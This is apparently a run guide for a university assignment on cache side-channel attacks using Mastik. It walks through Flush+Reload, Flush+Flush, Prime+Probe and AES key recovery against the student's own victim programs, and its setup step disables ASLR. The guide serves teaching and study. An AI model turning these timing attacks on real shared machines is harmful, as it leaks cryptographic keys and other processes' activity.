# Mastik Side-Channel Attacks — How to Run
## Masters Assignment Guide (Ubuntu 22.04 / 24.04 / 25.04)

---

## ⚡ Quick Start (3 commands)

```bash
sudo bash 0_setup.sh        # one-time: installs deps, builds Mastik, disables ASLR
bash 1_build.sh             # builds all 6 demo binaries
./calibrate                 # finds correct thresholds for YOUR CPU
```

---

## Prerequisites

- Linux x86-64 (Ubuntu 22.04 / 24.04 / 25.04 all confirmed working)
- Intel CPU (Mastik uses Intel-specific rdtscp / clflush)
- sudo access (to disable ASLR once per reboot)

---

## Known Issue: libdwarf on Ubuntu 22.04+

Ubuntu 22.04+ ships `libdwarf 0.4+` which removed the `dwarf_init()` API
that Mastik's configure script checks for. This causes:

```
configure: error: A working libdwarf is required for debug-symbols support
```

**Fix (already in 0_setup.sh):** pass `--disable-debug-symbols` to configure.
This disables DWARF symbol resolution (only needed for GnuPG demos, not our attacks).
All 4 main attacks work fine without it.

---

## Step 0 — One-Time Setup

```bash
sudo bash 0_setup.sh
```

What it does:
1. Installs `build-essential git binutils-dev libdwarf-dev libelf-dev`
2. Clones Mastik to `~/Mastik`
3. Builds with `./configure --disable-debug-symbols && make`
4. Disables ASLR (`/proc/sys/kernel/randomize_va_space = 0`)
5. Detects your libc path and `puts()` offset

> **After reboot:** re-run `sudo bash 0_setup.sh` to re-disable ASLR
> (the git clone and build are skipped if already done)

---

## Step 1 — Build

```bash
bash 1_build.sh
```

Builds: `calibrate`, `attack1_flush_reload`, `victim1`,
`attack2_prime_probe`, `attack3_flush_flush`, `attack4_aes_key_recovery`

Binaries are **statically linked** — no `LD_LIBRARY_PATH` needed.

---

## Step 2 — Calibrate (ALWAYS run this first on a new machine)

```bash
./calibrate
```

**Expected output:**
```
── Flush+Reload (Attack 1) ──────────────────────────
  Cache HIT  (hot reload) avg :  104 cycles
  Cache MISS (cold reload) avg:  304 cycles
  ✓ Suggested THRESHOLD       :  200 cycles

── Flush+Flush (Attack 3) ──────────────────────────
  Flush time when line IS   cached:  162 cycles
  Flush time when line NOT cached :  108 cycles
  ✓ Suggested FF_THRESHOLD : 135 cycles
```

If your thresholds differ a lot, edit `#define THRESHOLD` in
`attack1_flush_reload.c` and `attack3_flush_flush.c`, then re-run `bash 1_build.sh`.

### Find your puts() offset

```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@"
```

The second column (e.g. `0000000000087be0`) is your offset.
Check it matches `#define PUTS_OFFSET` in `attack1_flush_reload.c` and `attack3_flush_flush.c`.

---

## Attack 1 — Flush+Reload

**Two terminals.**

```bash
# Terminal 1:
./attack1_flush_reload

# Terminal 2 (while Terminal 1 is running):
./victim1
```

**What you'll see:**
```
[SLOT   4216] *** HIT ***  puts() called!  (reload = 96 cycles)
[SLOT   6310] *** HIT ***  puts() called!  (reload = 104 cycles)
```

Each HIT = one `puts()` call from victim detected across process boundary.

---

## Attack 2 — L1-D Prime+Probe

**Two terminals.**

```bash
# Terminal 1:
./attack2_prime_probe

# Terminal 2 (while Terminal 1 is running):
ls -la /usr/bin        # or ./victim1, or any active process
```

**What you'll see:**
```
Sample   1: evicted sets = [ 3(812) 7(4534) 19(1840) ] total=3
Sample   2: evicted sets = [ 3(966) 7(3218) ] total=2
```

Consistent sets across samples = victim's L1 memory footprint.

---

## Attack 3 — Flush+Flush (Stealthy)

**Two terminals.**

```bash
# Terminal 1:
./attack3_flush_flush

# Terminal 2:
./victim1
```

**What you'll see:**
```
[calibrate] Warm flush time (line in cache): 162 cycles
[calibrate] Cold flush time (line not in cache): 108 cycles
[SLOT   4218] *** HIT ***  puts() detected!  (flush = 158 cycles)
```

Key difference from F+R: spy **never reads** the target address — only times flushes.
More stealthy but higher false-positive rate.

---

## Attack 4 — AES Key Recovery

**Single terminal, self-contained.**

```bash
./attack4_aes_key_recovery
```

Or directly:
```bash
LD_LIBRARY_PATH=~/Mastik/src ~/Mastik/demo/ST-L1PP-AES
```

**What you'll see:**
```
Key byte  0 Guess: 2-    [heatmap across 256 candidates]
Key byte  1 Guess: 7-
```

Each row = one AES key byte. Brightest column = best guess.
Recovers key by measuring which AES T-table cache lines were accessed during encryption.

---

## Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `configure: error: A working libdwarf is required` | libdwarf 0.4+ API change | 0_setup.sh now uses `--disable-debug-symbols` — re-run it |
| `cannot find -lmastik` | Mastik build failed | Re-run `sudo bash 0_setup.sh`; check build didn't fail |
| `[!] Cannot find Mastik` | Build script can't find `~/Mastik` | Run `sudo bash 0_setup.sh` first, then `bash 1_build.sh` |
| No HITs in attack1/3 | Wrong PUTS_OFFSET or THRESHOLD | Run `./calibrate` and check the offset with `readelf` |
| ASLR re-enabled after reboot | Normal — kernel resets on boot | Re-run `sudo bash 0_setup.sh` (skips clone+build, just re-disables ASLR) |
| `0 LLC sets found` in L3 | VM hides LLC slice | Expected in VMs — L3 attack needs bare metal |

---

## File Structure

```
mastik_assignment/
├── 0_setup.sh                  ← run with sudo (once per fresh install; re-run after reboot for ASLR)
├── 1_build.sh                  ← builds all demos
├── mastik_shared.h             ← MAP_SHARED fix for Mastik's map_offset()
├── calibrate.c                 ← measures hit/miss timing thresholds for YOUR CPU
├── attack1_flush_reload.c      ← Flush+Reload spy on libc puts()
├── victim1.c                   ← victim process (calls puts every 300ms)
├── attack2_prime_probe.c       ← L1-D Prime+Probe cache footprint
├── attack3_flush_flush.c       ← Flush+Flush (stealthy variant)
├── attack4_aes_key_recovery.c  ← AES key recovery via L1 Prime+Probe
└── HOW_TO_RUN.md               ← this file
```

---

## Key Technical Fix (for your report)

Mastik's `map_offset()` in `src/util.c` uses `MAP_PRIVATE`:
```c
mmap(0, pgsz, PROT_READ, MAP_PRIVATE, fd, offset);  // WRONG for F+R
```

`MAP_PRIVATE` creates a copy-on-write mapping — a **different physical page**
than what the running libc uses. Flush+Reload requires the spy and victim to share
the **same physical cache line**.

Our fix in `mastik_shared.h`:
```c
mmap(NULL, pgsz, PROT_READ, MAP_SHARED, fd, offset);  // CORRECT
```

This is why the official `FR-function-call` demo silently produces no output
on modern Ubuntu systems.
